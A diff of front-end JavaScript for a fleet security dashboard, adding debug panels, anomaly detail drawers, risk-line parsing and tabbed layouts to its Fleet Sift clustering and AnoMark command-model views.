@@ -2631,20 +2631,129 @@
     return state._siftSelectedHosts;
   }
 
-  function siftProgressHtml() {
-    const prog = state._siftProgress;
+  function mlProgressHtml(prog, extraClass) {
     if (!prog) return "";
     const pct = Math.max(0, Math.min(100, Number(prog.pct) || 0));
     const steps = prog.steps || [];
-    return `<div class="import-progress sift-run-progress" role="status" aria-live="polite">
-      <div class="ip-title">${esc(prog.title || "Fleet Sift running…")}</div>
+    const debug = prog.debug || [];
+    return `<div class="import-progress sift-run-progress ${esc(extraClass || "")}" role="status" aria-live="polite">
+      <div class="ip-title">${esc(prog.title || "Working…")}</div>
       <p class="ip-detail mono">${esc(prog.detail || "")}</p>
       <div class="bar ${prog.indeterminate ? "indeterminate" : ""}"><span style="width:${pct}%"></span></div>
       <div class="ip-meta"><span>${esc(prog.phase || "")}</span><span class="mono">${pct}%</span></div>
       ${steps.length ? `<ol class="sift-progress-steps">${steps.map((s) => `
         <li class="sift-progress-step sift-progress-step--${esc(s.status || "pending")}">${esc(s.label)}</li>
       `).join("")}</ol>` : ""}
+      ${debug.length ? `<ul class="ml-debug-log">${debug.map((d) => `
+        <li><span class="mono muted">${esc(d.ts || "")}</span> ${esc(d.msg || "")}</li>
+      `).join("")}</ul>` : ""}
     </div>`;
+  }
+
+  function mlDebugNow() {
+    try {
+      return new Date().toLocaleTimeString();
+    } catch (_) {
+      return "";
+    }
+  }
+
+  function mlPushDebug(progKey, msg) {
+    const prog = state[progKey];
+    if (!prog) return;
+    const debug = [...(prog.debug || []), { ts: mlDebugNow(), msg: String(msg || "") }].slice(-12);
+    state[progKey] = { ...prog, debug };
+  }
+
+  function siftProgressHtml() {
+    return mlProgressHtml(state._siftProgress, "sift-run-progress");
+  }
+
+  function anomarkProgressHtml() {
+    return mlProgressHtml(state._anomarkProgress, "anomark-run-progress");
+  }
+
+  function siftRunDebugHtml(last) {
+    if (!last) return "";
+    const dbg = last._debug || state._siftLastDebug || {};
+    const sources = last.sources || [];
+    const procRows = sources.reduce((n, s) => n + Number(s.process_rows || 0), 0);
+    const fileRows = sources.reduce((n, s) => n + Number(s.file_rows || 0), 0);
+    const empty = sources.filter((s) => !Number(s.process_rows || 0) && !Number(s.file_rows || 0));
+    return `<details class="ml-details ml-debug-panel" ${dbg.open ? "open" : ""}>
+      <summary>Run debug <span class="muted">· inventory · sources · request</span></summary>
+      <div class="ml-debug-grid">
+        <div><dt>Run id</dt><dd class="mono">${esc(last.run_id || "—")}</dd></div>
+        <div><dt>Mode</dt><dd class="mono">${esc(last.mode || dbg.mode || "—")}</dd></div>
+        <div><dt>Inventory scan #</dt><dd class="mono">${esc(String(dbg.inventory ?? last.inventory ?? "1"))}</dd></div>
+        <div><dt>Config</dt><dd>${esc(last.detection_config_name || dbg.config_name || "inline")}</dd></div>
+        <div><dt>Hosts in request</dt><dd class="mono">${esc(String(dbg.host_count ?? sources.length ?? "—"))}</dd></div>
+        <div><dt>Sources returned</dt><dd class="mono">${esc(String(sources.length))}</dd></div>
+        <div><dt>Process rows</dt><dd class="mono">${esc(String(procRows))}</dd></div>
+        <div><dt>File rows</dt><dd class="mono">${esc(String(fileRows))}</dd></div>
+        <div><dt>Elapsed</dt><dd class="mono">${esc(dbg.elapsed_ms != null ? `${dbg.elapsed_ms} ms` : "—")}</dd></div>
+        <div><dt>Filters</dt><dd class="mono">${esc(dbg.filters || "—")}</dd></div>
+      </div>
+      ${empty.length ? `<p class="muted" style="font-size:0.8rem;margin:0.45rem 0 0">⚠ ${empty.length} source host(s) had no process/file rows for this inventory.</p>` : ""}
+      ${sources.length ? `
+      <div class="ml-table-scroll" style="margin-top:0.55rem;max-height:180px">
+        <table class="data"><thead><tr>
+          <th>Host</th><th>Kind</th><th>Process</th><th>File</th><th>Source</th>
+        </tr></thead><tbody>
+          ${sources.map((s) => `<tr>
+            <td><strong>${esc(s.display_name || s.host_id)}</strong></td>
+            <td class="mono">${esc(s.agent_kind || "—")}</td>
+            <td class="mono">${esc(String(s.process_rows ?? 0))}</td>
+            <td class="mono">${esc(String(s.file_rows ?? 0))}</td>
+            <td class="muted">${esc(s.source || "—")}</td>
+          </tr>`).join("")}
+        </tbody></table>
+      </div>` : ""}
+    </details>`;
+  }
+
+  function anomarkModelDetailHtml(model, inspect, trainResult) {
+    const m = model || {};
+    const req = m.request || trainResult?.record?.request || {};
+    const rec = trainResult?.record || m;
+    const insp = inspect || null;
+    return `<section class="panel ml-card ml-model-detail">
+      <div class="panel-head">
+        <h3>${esc(m.name || rec.name || "Model detail")}</h3>
+        <span class="mono muted">${esc(shortId(m.id || rec.id || trainResult?.train_id || ""))}</span>
+      </div>
+      <div class="ml-panel-body">
+        <div class="ml-debug-grid">
+          <div><dt>Lines trained</dt><dd class="mono">${esc(String(rec.training_line_count ?? m.training_line_count ?? "—"))}</dd></div>
+          <div><dt>Order</dt><dd class="mono">${esc(String(insp?.order ?? req.order ?? "—"))}</dd></div>
+          <div><dt>Column</dt><dd class="mono">${esc(req.column || "cmdline")}</dd></div>
+          <div><dt>Created</dt><dd class="mono">${esc(fmtWhen(rec.created_at || m.created_at))}</dd></div>
+          <div><dt>Status</dt><dd>${esc(trainResult?.status || (m.available === false ? "missing file" : "ready"))}</dd></div>
+          <div><dt>Favorite</dt><dd>${m.favorite || rec.favorite ? "yes" : "no"}</dd></div>
+          ${insp ? `
+          <div><dt>Contexts</dt><dd class="mono">${esc(String(insp.num_contexts ?? "—"))}</dd></div>
+          <div><dt>Transitions</dt><dd class="mono">${esc(String(insp.num_transitions ?? "—"))}</dd></div>
+          <div><dt>Alphabet</dt><dd class="mono">${esc(String(insp.alphabet_len ?? "—"))}</dd></div>
+          <div><dt>Prior (ln)</dt><dd class="mono">${esc(insp.prior != null ? Number(insp.prior).toFixed(4) : "—")}</dd></div>
+          <div><dt>Suspect thresh (ln)</dt><dd class="mono">${esc(insp.suspect_threshold_ln != null ? Number(insp.suspect_threshold_ln).toFixed(4) : "—")}</dd></div>
+          <div><dt>Model size</dt><dd class="mono">${esc(insp.file_size_bytes != null ? `${Math.round(insp.file_size_bytes / 1024)} KB` : "—")}</dd></div>
+          ` : ""}
+        </div>
+        ${insp?.where_generated ? `
+          <p class="muted" style="font-size:0.8rem;margin:0.55rem 0 0">
+            Generated ${esc(fmtWhen(insp.where_generated.generated_at))} ·
+            ${esc(insp.where_generated.source_label || "")} ·
+            ${esc(String(insp.where_generated.training_line_count ?? ""))} lines
+          </p>` : ""}
+        ${trainResult?._debug?.length ? `
+          <ul class="ml-debug-log" style="margin-top:0.55rem">
+            ${trainResult._debug.map((d) => `<li><span class="mono muted">${esc(d.ts || "")}</span> ${esc(d.msg || "")}</li>`).join("")}
+          </ul>` : ""}
+        <div class="toolbar" style="margin-top:0.55rem">
+          <button type="button" class="btn ghost tiny" data-anomark-inspect="${esc(m.id || rec.id || trainResult?.train_id || "")}">Inspect model</button>
+        </div>
+      </div>
+    </section>`;
   }
 
   function siftConfigDefaults() {
@@ -2766,6 +2875,104 @@
     </div>`;
   }
 
+  /** Parse IronSift "RISK DETECTED: name=… path=…" lines into structured rows. */
+  function siftParseRiskFactor(raw) {
+    const s = String(raw || "");
+    const m = s.match(/^RISK DETECTED:\s*(.*)$/i);
+    if (m) {
+      const fields = {};
+      for (const part of m[1].split(/\s+/)) {
+        const eq = part.indexOf("=");
+        if (eq > 0) fields[part.slice(0, eq)] = part.slice(eq + 1);
+      }
+      return {
+        kind: "risk",
+        name: fields.name || "—",
+        path: fields.path || "—",
+        parent: fields.parent || "—",
+        uid: fields.uid || "—",
+        count: fields.count || "—",
+        reasons: (fields.reasons || "").split(",").filter(Boolean),
+        raw: s,
+      };
+    }
+    if (/^Rare (process|file)/i.test(s)) {
+      return { kind: "rare", text: s, raw: s };
+    }
+    return { kind: "note", text: s, raw: s };
+  }
+
+  function showSiftAnomalyDetail(a, hostLabel, sources) {
+    if (!a) return;
+    const mid = a.machine_id || "—";
+    const kind = a._kind || "process";
+    const factors = (a.risk_factors || []).map(siftParseRiskFactor);
+    const risks = factors.filter((f) => f.kind === "risk");
+    const notes = factors.filter((f) => f.kind !== "risk");
+    const src = (sources || []).find((s) => s.host_id === mid || s.display_name === mid);
+    const hostRec = state.hostById?.[mid] || state.hosts?.find((h) => h.id === mid || h.display_name === mid);
+    const hostId = hostRec?.id || src?.host_id || "";
+    const cluster = a.cluster_assignment == null ? "outlier" : `cluster ${a.cluster_assignment}`;
+    openDrawer(`${hostLabel || mid}`, `
+      <div class="sift-detail-head">
+        <div class="sift-detail-title-row">
+          ${sev(String(a.severity || "medium").toLowerCase())}
+          <span class="pill neutral">${esc(kind)}</span>
+          <span class="muted mono">${esc(cluster)}</span>
+        </div>
+        <div class="muted" style="font-size:0.82rem;margin-top:0.35rem">
+          Host <strong title="${esc(mid)}">${esc(hostLabel || mid)}</strong>
+          ${src?.last_scan_at ? ` · last scan ${esc(fmtWhen(src.last_scan_at))}` : ""}
+        </div>
+      </div>
+      <dl class="kv">
+        <dt>Anomaly score</dt><dd>${siftScoreBar(a.anomaly_score)}</dd>
+        <dt>Inventory</dt><dd class="mono">${esc(String(a.process_count ?? "—"))} ${kind === "file" ? "files" : "processes"}
+          · ${esc(String(a.suspicious_process_count ?? 0))} flagged</dd>
+        <dt>Source rows</dt><dd class="mono">${esc(String(src?.process_rows ?? "—"))} proc · ${esc(String(src?.file_rows ?? "—"))} file</dd>
+      </dl>
+      ${risks.length ? `
+        <h4 class="sift-detail-h">Suspicious ${kind === "file" ? "files" : "processes"} (${risks.length})</h4>
+        <div class="ml-table-scroll">
+          <table class="data"><thead><tr>
+            <th>Name</th><th>Path</th><th>Parent</th><th>UID</th><th>Count</th><th>Reasons</th>
+          </tr></thead><tbody>
+            ${risks.map((r) => `<tr>
+              <td class="mono">${esc(r.name)}</td>
+              <td class="mono" title="${esc(r.path)}">${esc(String(r.path).length > 48 ? String(r.path).slice(0, 48) + "…" : r.path)}</td>
+              <td class="mono">${esc(r.parent)}</td>
+              <td class="mono">${esc(r.uid)}</td>
+              <td class="mono">${esc(r.count)}</td>
+              <td>${(r.reasons || []).map((x) => `<span class="tag">${esc(x)}</span>`).join(" ") || "—"}</td>
+            </tr>`).join("")}
+          </tbody></table>
+        </div>` : ""}
+      ${notes.length ? `
+        <h4 class="sift-detail-h">Other signals (${notes.length})</h4>
+        <ul class="sift-detail-notes">
+          ${notes.map((n) => `<li>${esc(n.text || n.raw)}</li>`).join("")}
+        </ul>` : (!risks.length ? `<div class="empty">No risk factor details for this anomaly.</div>` : "")}
+      <div class="form-actions" style="justify-content:flex-start;margin-top:1rem">
+        ${hostId ? `<button type="button" class="btn primary" data-sift-open-host="${esc(hostId)}">Open host</button>` : ""}
+        <button type="button" class="btn ghost" data-close-drawer>Close</button>
+      </div>
+      <details class="ml-details">
+        <summary>Raw anomaly JSON</summary>
+        <pre class="mono ml-score-pre">${esc(JSON.stringify(a, null, 2))}</pre>
+      </details>
+    `);
+    $$("[data-sift-open-host]", $("#drawerBody")).forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const id = btn.getAttribute("data-sift-open-host");
+        closeDrawer();
+        if (id) showHostDetail(id).catch((err) => toast(err.message));
+      });
+    });
+    $$("[data-close-drawer]", $("#drawerBody")).forEach((btn) => {
+      btn.addEventListener("click", () => closeDrawer());
+    });
+  }
+
   function siftSeveritySummary(rows) {
     const counts = { critical: 0, high: 0, medium: 0, low: 0 };
     for (const a of rows) {
@@ -2854,6 +3061,7 @@
         <div class="stat"><div class="label">Mode</div><div class="value">${esc(last.mode || mode)}</div></div>
         <div class="stat"><div class="label">Config</div><div class="value" style="font-size:0.88rem">${esc(last.detection_config_name || "default")}</div></div>
       </div>
+      ${siftRunDebugHtml(last)}
       ${all.length ? siftSeveritySummary(all) : ""}
       ${siftClusterStrip(last.report) || siftClusterStrip(last.file_report) || ""}
       ${!all.length ? `<div class="empty sift-results-empty">No anomalies in this run — fleet looks consistent.</div>` : `
@@ -2878,12 +3086,16 @@
       </div>
       ${!filtered.length
         ? `<div class="empty">No anomalies match these filters</div>`
-        : `<div class="sift-anom-list">
-            ${filtered.slice().sort((a, b) => {
+        : (() => {
+            const ranked = filtered.slice().sort((a, b) => {
               const sr = siftSeverityRank(b.severity) - siftSeverityRank(a.severity);
               if (sr) return sr;
               return Number(b.anomaly_score || 0) - Number(a.anomaly_score || 0);
-            }).map((a, idx) => {
+            });
+            state._siftResultRows = ranked;
+            state._siftResultSources = sources;
+            return `<div class="sift-anom-list">
+            ${ranked.map((a, idx) => {
               const mid = a.machine_id || "—";
               const hostLabel = (() => {
                 const src = sources.find((s) => s.host_id === mid || s.display_name === mid);
@@ -2896,7 +3108,7 @@
               const procs = a.process_count != null
                 ? `${a.suspicious_process_count ?? 0}/${a.process_count} suspicious procs`
                 : "";
-              return `<article class="sift-anom-card sift-anom-card--${esc(String(a.severity || "medium").toLowerCase())}">
+              return `<article class="sift-anom-card sift-anom-card--${esc(String(a.severity || "medium").toLowerCase())}" data-sift-anom="${esc(String(idx))}" role="button" tabindex="0" title="View anomaly details">
                 <div class="sift-anom-head">
                   <div class="sift-anom-title">
                     ${sev(String(a.severity || "medium").toLowerCase())}
@@ -2909,11 +3121,13 @@
                   <span>${esc(cluster)}</span>
                   ${procs ? `<span>· ${esc(procs)}</span>` : ""}
                   <span class="mono">#${idx + 1}</span>
+                  <span class="sift-anom-open">Details →</span>
                 </div>
                 ${siftRiskTags(a.risk_factors)}
               </article>`;
             }).join("")}
-          </div>`}`}
+          </div>`;
+          })()}`}
       ${sources.length ? `
       <details class="ml-details">
         <summary>Sources used (${sources.length})</summary>
@@ -2932,6 +3146,31 @@
           </tbody></table>
         </div>
       </details>` : ""}`;
+  }
+
+  function mlSubTabsHtml(tabs, active, attr) {
+    const a = attr || "data-ml-tab";
+    return `<div class="ml-subtabs host-detail-tabs" role="tablist">
+      ${tabs.map(([id, label, badge]) => {
+        const on = id === active;
+        const badgeHtml = badge != null && badge !== ""
+          ? ` <span class="ml-subtab-badge">${esc(String(badge))}</span>`
+          : "";
+        return `<button type="button" class="tab ${on ? "active" : ""}" ${a}="${esc(id)}" role="tab" aria-selected="${on}">${esc(label)}${badgeHtml}</button>`;
+      }).join("")}
+    </div>`;
+  }
+
+  function wireMlSubTabs(attr, stateKey, allowed) {
+    const a = attr || "data-ml-tab";
+    $$(`[${a}]`).forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const id = btn.getAttribute(a) || "";
+        if (allowed && !allowed.includes(id)) return;
+        state[stateKey] = id;
+        render();
+      });
+    });
   }
 
   function fleetSift() {
@@ -2958,14 +3197,14 @@
     const selectedVisible = filtered.filter((h) => selected.has(h.id)).length;
     const allVisibleSelected = filtered.length > 0 && filtered.every((h) => selected.has(h.id));
     const running = !!state._siftProgress;
-    const cfgOpen = !!state._siftConfigOpen;
     const activeRunId = last?.run_id || "";
 
     const configPanel = `
-      <details class="panel ml-card ml-config-fold" ${cfgOpen ? "open" : ""} id="siftCfgFold">
-        <summary class="panel-head ml-config-summary">
-          <h3>Detection config <span class="muted">${esc((profiles.find((p) => p.id === selectedCfgId)?.name) || "default")} · IronSift</span></h3>
-        </summary>
+      <section class="panel ml-card">
+        <div class="panel-head">
+          <h3>Detection config</h3>
+          <span class="muted">${esc((profiles.find((p) => p.id === selectedCfgId)?.name) || "default")} · IronSift</span>
+        </div>
         <div class="ml-panel-body">
           <div class="toolbar ml-toolbar-wrap" style="margin-bottom:0.65rem">
             <select id="siftProfileSelect" class="ml-select" title="Saved profile">
@@ -3011,37 +3250,14 @@
             </div>
           </details>
         </div>
-      </details>`;
+      </section>`;
 
     const resultsBody = siftResultsBody(last, mode);
+    const tab = ["run", "config", "results"].includes(state._siftTab) ? state._siftTab : "run";
+    state._siftTab = tab;
+    const anomCount = last ? Number(last.anomalies ?? (last.findings || []).length ?? 0) : 0;
 
-    return `
-      <div class="ml-workspace">
-        <header class="ml-hero panel">
-          <div class="ml-hero-copy">
-            <p class="ml-eyebrow">Fleet analytics</p>
-            <h2>Fleet Sift</h2>
-            <p class="muted">TF‑IDF + DBSCAN across the fleet — configure detection, scope hosts, then hunt outliers.</p>
-          </div>
-          <div class="ml-hero-actions">
-            <label class="ml-inline-label">Mode
-              <select id="siftMode" class="ml-select">
-                <option value="process" ${mode === "process" ? "selected" : ""}>Process</option>
-                <option value="file" ${mode === "file" ? "selected" : ""}>File</option>
-                <option value="both" ${mode === "both" ? "selected" : ""}>Both</option>
-              </select>
-            </label>
-            <button type="button" class="btn primary" id="btnSiftRun" ${running ? "disabled" : ""}>${running ? "Running…" : "Run on fleet"}</button>
-            <button type="button" class="btn ghost" id="btnSiftRefresh">Refresh</button>
-          </div>
-        </header>
-
-        ${siftProgressHtml()}
-
-        <div class="ml-split ml-split--sift">
-          <div class="ml-stack">
-            ${configPanel}
-
+    const scopePanel = `
             <section class="panel ml-card">
               <div class="panel-head">
                 <h3>Host scope <span class="muted">${selected.size ? `${selected.size} selected` : "all matching"} · ${filtered.length}</span></h3>
@@ -3127,16 +3343,17 @@
                 </tbody></table>`}
               </div>
               <div class="muted ml-foot-note">${selectedVisible} of ${filtered.length} visible checked · empty selection = all matching</div>
-            </section>
+            </section>`;
 
-            <section class="panel ml-card">
-              <div class="panel-head">
-                <h3>Results ${last ? `<span class="muted">${esc(fmtWhen(last.created_at))} · ${esc(shortId(last.run_id || ""))}</span>` : ""}</h3>
-                ${activeRunId ? `<button type="button" class="btn ghost tiny" data-sift-del="${esc(activeRunId)}">Delete this run</button>` : ""}
-              </div>
-              <div class="ml-panel-body">${resultsBody}</div>
-            </section>
-          </div>
+    const resultsPanel = `
+        <div class="ml-split ml-split--sift">
+          <section class="panel ml-card">
+            <div class="panel-head">
+              <h3>Results ${last ? `<span class="muted">${esc(fmtWhen(last.created_at))} · ${esc(shortId(last.run_id || ""))}</span>` : ""}</h3>
+              ${activeRunId ? `<button type="button" class="btn ghost tiny" data-sift-del="${esc(activeRunId)}">Delete this run</button>` : ""}
+            </div>
+            <div class="ml-panel-body">${resultsBody}</div>
+          </section>
 
           <aside class="panel ml-card ml-runs-rail">
             <div class="panel-head">
@@ -3166,7 +3383,45 @@
               }).join("")}
             </ul>`}
           </aside>
-        </div>
+        </div>`;
+
+    const tabBody = tab === "config"
+      ? configPanel
+      : tab === "results"
+        ? resultsPanel
+        : `<div class="ml-stack">${scopePanel}</div>`;
+
+    return `
+      <div class="ml-workspace">
+        <header class="ml-hero panel">
+          <div class="ml-hero-copy">
+            <p class="ml-eyebrow">Fleet analytics</p>
+            <h2>Fleet Sift</h2>
+            <p class="muted">TF‑IDF + DBSCAN across the fleet — configure detection, scope hosts, then hunt outliers.</p>
+          </div>
+          <div class="ml-hero-actions">
+            ${tab === "run" ? `
+            <label class="ml-inline-label">Mode
+              <select id="siftMode" class="ml-select">
+                <option value="process" ${mode === "process" ? "selected" : ""}>Process</option>
+                <option value="file" ${mode === "file" ? "selected" : ""}>File</option>
+                <option value="both" ${mode === "both" ? "selected" : ""}>Both</option>
+              </select>
+            </label>
+            <button type="button" class="btn primary" id="btnSiftRun" ${running ? "disabled" : ""}>${running ? "Running…" : "Run on fleet"}</button>` : ""}
+            <button type="button" class="btn ghost" id="btnSiftRefresh">Refresh</button>
+          </div>
+        </header>
+
+        ${siftProgressHtml()}
+
+        ${mlSubTabsHtml([
+          ["run", "Run", filtered.length || null],
+          ["config", "Config"],
+          ["results", "Results", last ? anomCount : (runs.length || null)],
+        ], tab, "data-sift-tab")}
+
+        ${tabBody}
       </div>`;
   }
 
@@ -3199,16 +3454,27 @@
     }
   }
 
-  function startSiftProgress(hostCount) {
+  function startSiftProgress(hostCount, meta = {}) {
+    const inv = meta.inventory || siftInventoryIndex();
+    const mode = meta.mode || state._siftMode || "process";
+    const filters = [
+      meta.env ? `env=${meta.env}` : "",
+      meta.kind ? `kind=${meta.kind}` : "",
+      meta.q ? `q=${meta.q}` : "",
+    ].filter(Boolean).join(" · ") || "none";
     const phases = [
-      { id: "scope", label: "Scope hosts", detail: `Matching ${hostCount} host(s)…`, pct: 12 },
-      { id: "extract", label: "Extract inventory", detail: "Loading process/file rows from scans…", pct: 38 },
+      { id: "scope", label: "Scope hosts", detail: `Matching ${hostCount} host(s) · filters: ${filters}`, pct: 12 },
+      { id: "extract", label: "Extract inventory", detail: `Loading ${mode} rows from scan #${inv}…`, pct: 38 },
       { id: "cluster", label: "TF-IDF + DBSCAN", detail: "Building profiles and clustering…", pct: 68 },
       { id: "findings", label: "Score anomalies", detail: "Ranking outliers and writing run…", pct: 88 },
     ];
     let idx = 0;
     const apply = () => {
       const p = phases[idx];
+      const prevDebug = state._siftProgress?.debug || [
+        { ts: mlDebugNow(), msg: `Start · ${hostCount} host(s) · mode=${mode} · inventory=#${inv}` },
+        { ts: mlDebugNow(), msg: `Filters: ${filters}` },
+      ];
       state._siftProgress = {
         title: "Fleet Sift running",
         phase: p.label,
@@ -3219,16 +3485,14 @@
           label: ph.label,
           status: i < idx ? "done" : i === idx ? "active" : "pending",
         })),
+        debug: prevDebug,
       };
-      const el = document.querySelector(".sift-run-progress");
-      if (el && state.view === "fleet-sift") {
-        // light update without full re-render mid-request when possible
-        render();
-      }
+      if (state.view === "fleet-sift") render();
     };
     apply();
     const timer = window.setInterval(() => {
       idx = Math.min(idx + 1, phases.length - 1);
+      mlPushDebug("_siftProgress", phases[idx].detail);
       apply();
       if (idx >= phases.length - 1) window.clearInterval(timer);
     }, 900);
@@ -3244,12 +3508,14 @@
       window.clearInterval(state._siftProgressTimer);
       state._siftProgressTimer = null;
     }
+    const debug = [...(state._siftProgress?.debug || []), { ts: mlDebugNow(), msg: detail || "Done" }];
     state._siftProgress = {
       title: "Fleet Sift complete",
       phase: "Done",
       detail: detail || "Finished",
       pct: 100,
       indeterminate: false,
+      debug,
       steps: [
         { label: "Scope hosts", status: "done" },
         { label: "Extract inventory", status: "done" },
@@ -3298,6 +3564,8 @@
   }
 
   function wireFleetSift() {
+    wireMlSubTabs("data-sift-tab", "_siftTab", ["run", "config", "results"]);
+
     const modeSel = $("#siftMode");
     if (modeSel) {
       modeSel.addEventListener("change", () => {
@@ -3381,6 +3649,29 @@
       });
     });
 
+    $$("[data-sift-anom]").forEach((card) => {
+      const open = () => {
+        const idx = Number(card.getAttribute("data-sift-anom"));
+        const row = (state._siftResultRows || [])[idx];
+        if (!row) return;
+        const mid = row.machine_id || "";
+        const sources = state._siftResultSources || state._siftLast?.sources || [];
+        const hostLabel = (() => {
+          const src = sources.find((s) => s.host_id === mid || s.display_name === mid);
+          if (src?.display_name) return src.display_name;
+          return state.hostById?.[mid]?.display_name || mid;
+        })();
+        showSiftAnomalyDetail(row, hostLabel, sources);
+      };
+      card.addEventListener("click", open);
+      card.addEventListener("keydown", (e) => {
+        if (e.key === "Enter" || e.key === " ") {
+          e.preventDefault();
+          open();
+        }
+      });
+    });
+
     $$(".sift-host-cb").forEach((cb) => {
       cb.addEventListener("change", () => {
         const set = siftSelectedHostIds();
@@ -3415,19 +3706,43 @@
         btnRun.disabled = true;
         const body = buildSiftRunBody();
         const hostCount = body.host_ids?.length || siftFilteredHosts().length || (state.hosts || []).length;
-        const stop = startSiftProgress(hostCount);
+        const t0 = performance.now();
+        const stop = startSiftProgress(hostCount, {
+          inventory: body.inventory,
+          mode: body.mode,
+          env: state._siftEnv,
+          kind: state._siftKind,
+          q: state._siftHostQ,
+        });
         try {
           const res = await api("/v1/sift/runs", { method: "POST", body });
           stop();
-          state._siftLast = res;
+          const elapsed_ms = Math.round(performance.now() - t0);
+          const sources = res.sources || [];
+          const procRows = sources.reduce((n, s) => n + Number(s.process_rows || 0), 0);
+          const fileRows = sources.reduce((n, s) => n + Number(s.file_rows || 0), 0);
+          state._siftLastDebug = {
+            inventory: body.inventory,
+            mode: body.mode,
+            host_count: hostCount,
+            config_name: res.detection_config_name,
+            filters: [
+              state._siftEnv ? `env=${state._siftEnv}` : "",
+              state._siftKind ? `kind=${state._siftKind}` : "",
+              state._siftHostQ ? `q=${state._siftHostQ}` : "",
+            ].filter(Boolean).join(" · ") || "none",
+            elapsed_ms,
+          };
+          state._siftLast = { ...res, _debug: state._siftLastDebug };
+          state._siftTab = "results";
           state._siftResultTab = null;
           state._siftResultQ = "";
           state._siftResultSev = "";
           finishSiftProgress(
-            `${res.machines || 0} machines · ${res.anomalies || 0} anomal${(res.anomalies || 0) === 1 ? "y" : "ies"} · config ${res.detection_config_name || "inline"}`
+            `${res.machines || 0} machines · ${res.anomalies || 0} anomal${(res.anomalies || 0) === 1 ? "y" : "ies"} · ${procRows}p/${fileRows}f rows · ${elapsed_ms}ms · config ${res.detection_config_name || "inline"}`
           );
           await refreshSiftRuns();
-          toast(`Sift complete — ${res.anomalies || 0} anomal${(res.anomalies || 0) === 1 ? "y" : "ies"}`);
+          toast(`Sift complete — ${res.anomalies || 0} anomal${(res.anomalies || 0) === 1 ? "y" : "ies"} in ${elapsed_ms}ms`);
           render();
           clearSiftProgressSoon();
         } catch (err) {
@@ -3470,6 +3785,7 @@
           state._siftResultTab = null;
           state._siftResultQ = "";
           state._siftResultSev = "";
+          state._siftTab = "results";
           render();
         } catch (err) {
           toast(err.message);
@@ -3509,13 +3825,6 @@
         } catch (err) {
           toast(err.message || "Clear failed");
         }
-      });
-    }
-
-    const siftFold = $("#siftCfgFold");
-    if (siftFold) {
-      siftFold.addEventListener("toggle", () => {
-        state._siftConfigOpen = siftFold.open;
       });
     }
 
@@ -3671,17 +3980,12 @@
   }
 
   async function refreshAnoMark() {
-    const [modelsRes, auto, avail] = await Promise.all([
+    const [modelsRes, avail] = await Promise.all([
       api("/v1/anomark/models"),
-      api("/v1/anomark/auto"),
       api("/v1/anomark/availability").catch(() => null),
     ]);
     state._anomarkModels = modelsRes.models || [];
-    state._anomarkAuto = auto || {};
     state._anomarkAvail = avail;
-    if (!state._anomarkAutoHostSel && Array.isArray(auto?.host_ids)) {
-      state._anomarkAutoHostSel = auto.host_ids.map(String);
-    }
     if (!state._anomarkSelectedModel && state._anomarkModels.length) {
       const fav = state._anomarkModels.find((m) => m.favorite);
       state._anomarkSelectedModel = (fav || state._anomarkModels[0]).id;
@@ -3799,55 +4103,58 @@
 
   function anomark() {
     const models = state._anomarkModels || [];
-    const auto = state._anomarkAuto || {};
     const avail = state._anomarkAvail || {};
     const selected = state._anomarkSelectedModel || "";
     const last = state._anomarkLastApply || null;
     const score = state._anomarkScore || null;
-    const checkSets = (auto.check_sets || []).join(", ");
     const selectedModel = models.find((m) => m.id === selected) || null;
     const readyCount = models.filter((m) => m.available !== false).length;
-    return `
-      <div class="ml-workspace">
-        <header class="ml-hero panel">
-          <div class="ml-hero-copy">
-            <p class="ml-eyebrow">Command Markov models</p>
-            <h2>AnoMark</h2>
-            <p class="muted">Train models from host inventories, score commands, and optionally auto-run after scans.</p>
-          </div>
-          <div class="ml-hero-actions">
-            <button type="button" class="btn primary" id="btnAnoMarkNew">Train model</button>
-            <button type="button" class="btn ghost" id="btnAnoMarkRefresh">Refresh</button>
-          </div>
-        </header>
+    const tab = ["models", "score", "try"].includes(state._anomarkTab)
+      ? state._anomarkTab
+      : "models";
+    state._anomarkTab = tab;
+    const suspectTotal = last ? Number(last.total_suspects ?? 0) : 0;
 
-        <div class="stats ml-kpi-row">
-          <div class="stat"><div class="label">Models</div><div class="value">${models.length.toLocaleString()}</div></div>
-          <div class="stat ${avail.any_available === false ? "crit" : ""}"><div class="label">Ready</div><div class="value">${avail.any_available === false ? "0" : String(readyCount)}</div></div>
-          <div class="stat"><div class="label">Auto-scan</div><div class="value">${auto.enabled ? "On" : "Off"}</div></div>
-          <div class="stat"><div class="label">Active model</div><div class="value" style="font-size:0.9rem">${esc(selectedModel?.name || (selected ? shortId(selected) : "—"))}</div></div>
-        </div>
-
-        <div class="ml-split ml-split--anomark">
+    const modelsPanel = `
+          ${state._anomarkLastTrain ? `
+          <div class="ml-train-banner">
+            <div class="ml-train-banner-head">
+              <strong>Last training succeeded</strong>
+              <span class="muted mono">${esc(fmtWhen(state._anomarkLastTrain.record?.created_at))} · ${state._anomarkLastTrain._elapsed_ms != null ? `${esc(String(state._anomarkLastTrain._elapsed_ms))} ms` : ""}</span>
+            </div>
+            ${anomarkModelDetailHtml(
+              models.find((x) => x.id === (state._anomarkLastTrain.train_id || state._anomarkLastTrain.record?.id)) || state._anomarkLastTrain.record,
+              state._anomarkInspect?.id === (state._anomarkLastTrain.train_id || state._anomarkLastTrain.record?.id)
+                ? state._anomarkInspect
+                : null,
+              state._anomarkLastTrain
+            )}
+          </div>` : ""}
           <section class="panel ml-card">
             <div class="panel-head">
               <h3>Models</h3>
-              <span class="muted">${models.length ? "Click a row to select" : "None yet"}</span>
+              <span class="muted">${models.length ? "Click a card to select" : "None yet"}</span>
             </div>
             ${!models.length ? `<div class="empty ml-empty-hero">No models yet — train from host inventories or paste command lines</div>` : `
             <div class="ml-model-list">
               ${models.map((m) => {
                 const active = m.id === selected ? " is-selected" : "";
+                const order = m.request?.order ?? "—";
+                const lines = m.training_line_count ?? "—";
+                const col = m.request?.column || "cmdline";
                 return `<article class="ml-model-card${active}" data-anomark-pick="${esc(m.id)}" tabindex="0" role="button">
                   <div class="ml-model-card-top">
                     <strong>${m.favorite ? "★ " : ""}${esc(m.name || m.id)}</strong>
                     <span class="mono muted">${esc(shortId(m.id))}</span>
                   </div>
                   <div class="ml-model-card-meta">
-                    <span>${esc(String(m.training_line_count ?? "—"))} lines</span>
+                    <span>${esc(String(lines))} lines</span>
+                    <span>order ${esc(String(order))}</span>
+                    <span class="mono muted">${esc(col)}</span>
                     <span class="muted">${esc(fmtTime(m.created_at))}</span>
                   </div>
